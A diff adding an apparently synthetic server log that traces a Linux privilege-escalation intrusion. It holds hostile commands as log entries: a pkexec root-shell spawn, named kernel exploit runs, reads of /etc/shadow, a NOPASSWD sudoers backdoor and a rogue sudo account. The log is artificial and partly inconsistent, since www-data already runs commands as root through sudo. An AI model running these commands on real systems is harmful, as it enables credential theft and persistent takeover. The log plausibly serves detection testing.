@@ -1,0 +1,19 @@
+Jul 28 17:00:00 web-server auditd[14010]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=55a1b2c3d400 a1=55a1b2c3d500 a2=55a1b2c3d600 a3=0 items=2 ppid=14005 pid=14011 auid=1010 uid=1010 gid=1010 euid=1010 suid=1010 fsuid=1010 egid=1010 sgid=1010 fsgid=1010 tty=pts0 ses=9 comm="whoami" exe="/usr/bin/whoami"
+Jul 28 17:00:05 web-server sudo[14015]:   www-data : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/find / -perm -4000 -type f 2>/dev/null
+Jul 28 17:00:15 web-server sudo[14020]:   www-data : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c '/usr/bin/find / -writable -type f 2>/dev/null | /usr/bin/head -20'
+Jul 28 17:00:30 web-server sudo[14025]:   www-data : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c '/usr/bin/python3 -c "import os; os.execlp(\"pkexec\", \"pkexec\", \"--user\", \"root\", \"/bin/bash\")"'
+Jul 28 17:00:45 web-server sudo[14030]:   www-data : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/cve-2021-4034-pwn  # CVE-2021-4034 (PwnKit) exploit
+Jul 28 17:01:00 web-server auditd[14035]: SYSCALL arch=c000003e syscall=101 success=yes exit=0 a0=2 a1=7ffe0b0b0b00 a2=7f1b2c3d4e00 a3=0 items=0 ppid=1 pid=14036 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 comm="bash" exe="/usr/bin/bash" key="setuid"
+Jul 28 17:01:15 web-server auditd[14040]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=55a1b2c3d700 a1=55a1b2c3d800 a2=55a1b2c3d900 a3=0 items=2 ppid=14036 pid=14041 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 comm="python3" exe="/usr/bin/python3"
+Jul 28 17:01:30 web-server sudo[14045]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Jul 28 17:01:45 web-server sudo[14050]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/sudoers
+Jul 28 17:02:00 web-server sudo[14055]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c 'echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'
+Jul 28 17:02:15 web-server sudo[14060]:   www-data : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/cve-2022-0847  # CVE-2022-0847 (DirtyPipe) exploit
+Jul 28 17:02:30 web-server kernel: [ 1234.5678] CVE-2022-0847: DirtyPipe exploit attempt detected from process 14065
+Jul 28 17:02:45 web-server sudo[14070]:   www-data : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/exploit_cve_2023_2640  # CVE-2023-2640 (Ubuntu overlayfs)
+Jul 28 17:03:00 web-server kernel: [ 1234.6789] overlayfs: failed to redirect for lower file (error: -95)
+Jul 28 17:03:30 web-server sudo[14075]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/adduser attacker sudo
+Jul 28 17:03:45 web-server sudo[14080]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/usermod -aG sudo attacker
+Jul 28 17:04:00 web-server sshd[14085]: Accepted password for attacker from 185.220.110.60 port 60001 ssh2
+Jul 28 17:04:01 web-server sshd[14085]: pam_unix(sshd:session): session opened for user attacker by (uid=0)
+Jul 28 17:04:30 web-server sudo[14090]: attacker : TTY=pts/2 ; PWD=/home/attacker ; USER=root ; COMMAND=/usr/bin/su -
